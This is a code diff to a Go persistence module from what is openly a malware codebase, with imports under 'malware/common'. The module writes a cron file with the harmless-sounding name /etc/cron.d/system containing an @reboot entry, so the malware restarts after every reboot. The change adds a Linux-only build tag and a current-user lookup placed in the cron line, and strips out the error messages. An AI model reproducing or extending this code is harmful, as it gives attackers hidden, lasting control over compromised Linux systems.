@@ -1,3 +1,5 @@
+// +build linux
+
 package cron_persistence
 
 import (
@@ -6,6 +8,7 @@ import (
 	"malware/common/messages"
 	"malware/common/types"
 	"os"
+	"os/user"
 )
 
 /**
@@ -17,6 +20,8 @@ type settings struct {
 
 // Create creates an implementation of settings
 func Create() types.Module {
+	// This module requires root so lets test that here
+
 	return settings{}
 }
 
@@ -35,13 +40,16 @@ func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback
 	} else {
 		ex, err := os.Executable()
 		if err != nil {
-			fmt.Println(err)
 			return true
 		}
 
-		err = ioutil.WriteFile("/etc/cron.d/system", []byte(fmt.Sprintf("@reboot %s\n", ex)), 0640)
+		user, err := user.Current()
 		if err != nil {
-			fmt.Println(err)
+			return true
+		}
+
+		err = ioutil.WriteFile("/etc/cron.d/system", []byte(fmt.Sprintf("@reboot %s %s\n", user.Name, ex)), 0640)
+		if err != nil {
 			return true
 		}
 	}
